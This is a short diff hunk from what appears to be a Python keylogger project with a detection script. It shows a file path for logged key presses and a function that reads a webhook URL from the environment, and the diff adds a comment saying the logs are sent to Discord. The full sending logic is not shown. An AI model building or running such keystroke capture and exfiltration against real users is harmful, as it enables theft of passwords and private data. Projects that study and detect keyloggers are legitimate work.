@@ -8,6 +8,7 @@ from dotenv import load_dotenv
 log_file = "Python/Projects/Keylogger-and-Detection-Script/key_presses.txt"
 keys_pressed = "" 
 
+# this loads and sends the logs to discord
 def send_log_to_discord():
     load_dotenv()
     webhook = os.getenv("WEBHOOK_URL")
